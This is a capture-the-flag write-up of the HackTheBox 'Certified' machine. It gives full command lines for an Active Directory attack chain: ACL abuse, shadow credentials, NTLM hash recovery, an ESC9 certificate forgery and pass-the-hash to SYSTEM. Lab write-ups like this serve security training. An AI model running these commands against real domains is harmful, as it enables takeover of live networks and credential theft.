---
title: "HTB Certified - Active Directory Certificate Services and ESC9"
date: 2026-05-21
draft: true
tags:
  - htb
  - windows
  - medium
  - active-directory
  - bloodhound
  - kerberos
  - pass-the-hash
  - evil-winrm
  - write-up
description: "Certified is a Medium Windows AD box where you chain WriteOwner and GenericWrite ACL abuses to reach a certificate authority operator, then exploit ESC9 to forge an admin certificate and own the domain."
ShowToc: true
cover:
  image: "/images/htb-certified/cover.png"
  alt: "HTB Certified machine avatar"
---

## Machine Information

| Field      | Details              |
|------------|----------------------|
| Name       | Certified            |
| Platform   | HackTheBox           |
| OS         | Windows              |
| Difficulty | Medium               |

You start this box with valid low-privilege domain credentials: `judith.mader` / `judith09`. The path to Administrator is a chain of ACL abuses through Active Directory — no CVE, no exotic exploit, just misplaced permissions and the right tooling.

## TL;DR

`judith.mader` has **WriteOwner** on the Management group. That lets us take ownership, grant ourselves FullControl via DACL edit, and add judith to the group. Management has **GenericWrite** on `management_svc`, so we use **pywhisker** to inject shadow credentials and retrieve the NTLM hash via PKINITtools. With `management_svc` on the box we find **GenericAll** on `ca_operator` in BloodHound, reset its password, then exploit **ESC9** with certipy to forge an Administrator certificate. Final step: psexec as SYSTEM.

## Recon

Standard nmap first to see what we're dealing with:

{{< figure src="/images/htb-certified/nmap-scan.png" alt="nmap scan showing open ports on certified.htb" >}}

Typical Windows DC setup — 445, 389, 636, 3268, 5985, and the Kerberos ports. Nothing unusual on the surface.

## Enumeration

With valid creds we can enumerate the domain right away with nxc:

{{< figure src="/images/htb-certified/domain-users.png" alt="nxc smb enumeration showing domain users and groups" >}}

The domain is `certified.htb`. We can see users like `management_svc`, `ca_operator`, `alexander.huges`, and `gregory.cameron` alongside the usual built-in accounts. Let's fire up BloodHound to map the relationships.

```bash
bloodhound-python -d certified.htb -u 'judith.mader' -p 'judith09' -dc 'dc01.certified.htb' -c all -ns 10.129.231.186
```

{{< figure src="/images/htb-certified/bloodhound-collect.png" alt="bloodhound-python collection output showing 10 users, 53 groups found" >}}

BloodHound immediately lights up something interesting. Judith has **WriteOwner** on the Management group:

{{< figure src="/images/htb-certified/bh-writeowner.png" alt="BloodHound graph showing JUDITH.MADER has WriteOwner edge to MANAGEMENT group" >}}

And if we follow the path further, Management has **GenericWrite** on `management_svc`:

{{< figure src="/images/htb-certified/bh-genericwrite.png" alt="BloodHound graph showing WriteOwner to MANAGEMENT group then GenericWrite to MANAGEMENT_SVC" >}}

One more hop to check — `management_svc` has **GenericAll** on `ca_operator`:

{{< figure src="/images/htb-certified/bh-genericall-caoperator.png" alt="BloodHound showing MANAGEMENT_SVC has GenericAll over CA_OPERATOR" >}}

That's our full attack chain right there. Three hops and we'll have enough to escalate to admin via certificate abuse.

One thing worth noting: when I first tried `GetUserSPNs` to check for Kerberoastable accounts, I got a clock skew error:

{{< figure src="/images/htb-certified/getuserspns-clockskew.png" alt="impacket GetUserSPNs showing Kerberos clock skew error" >}}

Kerberos requires clocks to be within 5 minutes of the DC. Quick fix:

```bash
sudo ntpdate -u 10.129.231.186
```

{{< figure src="/images/htb-certified/ntpdate-fix.png" alt="ntpdate syncing clock with the domain controller" >}}

## Foothold — ACL Chain: WriteOwner → Management → management_svc

### Step 1: Take ownership of the Management group

`WriteOwner` means we can set the owner of the object to ourselves. Once we own it, we can modify the DACL and grant FullControl:

```bash
impacket-owneredit certified.htb/judith.mader:'judith09' -action write -new-owner judith.mader -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb'

impacket-dacledit certified.htb/judith.mader:'judith09' -action write -rights FullControl -principal judith.mader -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb'
```

{{< figure src="/images/htb-certified/owneredit-dacledit.png" alt="impacket owneredit and dacledit successfully modifying Management group permissions" >}}

Now add judith to Management:

```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S "10.129.231.186"
```

Verify she's in:

```bash
net rpc group members "Management" -U "certified.htb/judith.mader%judith09" -S "10.129.231.186"
```

### Step 2: Abuse GenericWrite on management_svc via Shadow Credentials

GenericWrite on a user means we can write to their `msDS-KeyCredentialLink` attribute — that's what enables **Shadow Credentials**. The idea is to inject our own certificate-based credential, then use it to get a TGT and extract the NTLM hash without ever touching the user's password.

```bash
python3 pywhisker.py -d certified.htb -u judith.mader -p 'judith09' --dc-ip 10.129.231.186 add shadowCredentials management_svc
```

{{< figure src="/images/htb-certified/pywhisker.png" alt="pywhisker adding shadow credentials to management_svc and outputting certificate path" >}}

This gives us a certificate and key pair. Now use PKINITtools to authenticate with it and get a TGT:

```bash
python3 PKINITtools/gettgtinit.py -cert-pem Wr9hCp58_cert.pem -key-pem Wr9hCp58_priv.pem certified.htb/management_svc Wr9hCp58.ccache
```

{{< figure src="/images/htb-certified/pkinit-tgt.png" alt="PKINITtools gettgtinit successfully obtaining TGT for management_svc" >}}

With a TGT in hand, we can use `getnthash.py` to recover the NTLM hash:

```bash
export KRB5CCNAME=Wr9hCp58.ccache
python3 PKINITtools/getnthash.py -key e0b16bfd5e8a9a38a5f267d6f763f6862d6b2855dd85fa173933f1eb48c87a5f certified.htb/management_svc
```

{{< figure src="/images/htb-certified/getnthash.png" alt="getnthash.py recovering NTLM hash a091c1832bcdd4677c28b5a6a1295584 for management_svc" >}}

NTLM hash: `a091c1832bcdd4677c28b5a6a1295584`

Quick check that WinRM is open for this account:

{{< figure src="/images/htb-certified/nxc-winrm-pwned.png" alt="nxc winrm showing management_svc as Pwn3d on port 5985" >}}

```bash
evil-winrm -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -i 10.129.231.186
```

{{< figure src="/images/htb-certified/evil-winrm-shell.png" alt="Evil-WinRM shell connected as management_svc" >}}

### User flag

```bash
type C:\Users\management_svc\Desktop\user.txt
```

{{< figure src="/images/htb-certified/user-flag.png" alt="user.txt flag on management_svc desktop" >}}

## Privilege Escalation — GenericAll on ca_operator → ESC9

Back in BloodHound, `management_svc` has **GenericAll** over `ca_operator`. GenericAll is full object control — we can reset the password without knowing the current one.

```bash
bloodyAD -u management_svc -d certified.htb --dc-ip 10.129.231.186 -p :a091c1832bcdd4677c28b5a6a1295584 set password ca_operator 'Password123!'
```

{{< figure src="/images/htb-certified/bloodyad-password-reset.png" alt="bloodyAD successfully resetting ca_operator password" >}}

Verify the creds work:

{{< figure src="/images/htb-certified/nxc-caoperator.png" alt="nxc smb confirming ca_operator credentials are valid" >}}

Now let's see what `ca_operator` can do with the CA. Use certipy to find vulnerable templates:

```bash
certipy-ad find -u ca_operator@certified.htb -p 'Password123!' -dc-ip 10.129.231.186 -vulnerable -stdout
```

**ESC9** — the `CertifiedAuthentication` template has no security extension (`szOID_NTDS_CA_SECURITY_EXT`). This means we can request a certificate for one UPN and then change it back — the CA won't bind the cert to the original requester's identity. We can impersonate Administrator.

The exploit steps:

**1.** Update `ca_operator`'s UPN to match Administrator, using `management_svc`'s hash (GenericAll means we can write attributes):

```bash
certipy-ad account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator@certified.htb -dc-ip 10.129.231.186
```

**2.** Request the certificate as ca_operator (whose UPN is now `administrator@certified.htb`):

```bash
certipy-ad req -u ca_operator@certified.htb -p 'Password123!' -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
```

**3.** Revert the UPN back to avoid breaking things:

```bash
certipy-ad account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
```

**4.** Authenticate with the forged cert to get the Administrator NTLM hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186
```

{{< figure src="/images/htb-certified/certipy-auth.png" alt="certipy-ad auth recovering administrator NTLM hash via forged certificate" >}}

Administrator hash: `0d5b49608bbce1751f708748f67e2d34`

### Root

```bash
impacket-psexec administrator@10.129.231.186 -hashes :0d5b49608bbce1751f708748f67e2d34
```

{{< figure src="/images/htb-certified/psexec-root.png" alt="impacket psexec shell as NT AUTHORITY SYSTEM reading root.txt" >}}

## Takeaways

- **ESC9 doesn't need template modification rights** - just a user with enrollment rights and another with GenericAll or GenericWrite on them. The attack works because the cert's SAN is set from the UPN at request time, and the CA doesn't cryptographically bind it to the requester.
- **WriteOwner is often overlooked** — it doesn't look as scary as GenericAll, but it's a path to anything. Own the object, edit the DACL, you have whatever you want.
- **Shadow Credentials are stealthy** — you're not touching the user's password or SPNs. You're writing to `msDS-KeyCredentialLink` which doesn't trigger password-change alerts. Hard to detect without dedicated AD CS monitoring.
- **BloodHound with LEGACY mode** picked up all these edges cleanly. Always worth running collection with `-c all`.

## References

- [ESC9 - No Security Extension (SpecterOps)](https://posts.specterops.io/adcs-esc9-and-esc10-abusing-certificate-templates-2-0-c4d3a5a7e41d)
- [pywhisker - Shadow Credentials](https://github.com/ShutdownRepo/pywhisker)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [impacket-dacledit](https://github.com/fortra/impacket)
